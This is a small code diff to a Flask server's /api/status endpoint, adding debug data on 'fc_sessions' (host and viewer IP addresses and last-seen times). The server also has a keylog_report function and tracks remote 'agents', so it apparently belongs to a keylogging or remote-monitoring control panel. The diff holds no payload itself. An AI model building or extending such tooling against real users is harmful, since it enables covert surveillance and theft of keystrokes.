@@ -405,9 +405,21 @@ def keylog_report(agent_name):
 
 @app.route("/api/status")
 def api_status():
+    now = time.time()
+    fc_debug = {}
+    with _fc_lock:
+        for sid_bytes, s in _fc_sessions.items():
+            fc_debug[sid_bytes.hex()] = {
+                "host_alive":   _fc_host_alive(s),
+                "host_addr":    str(s.host_addr) if s.host_addr else None,
+                "host_last_seen": round(now - s.host_time, 1) if s.host_time else None,
+                "viewer_count": len(s.viewer_addrs),
+                "viewer_addrs": [str(a) for a in s.viewer_addrs],
+            }
     return jsonify({
         "agents": list(agents.values()),
         "fastcap_cache": {k: {ek: ev for ek, ev in v.items() if ek != "password"} for k, v in _fastcap_cache.items()},
+        "fc_sessions": fc_debug,
     })
 
 
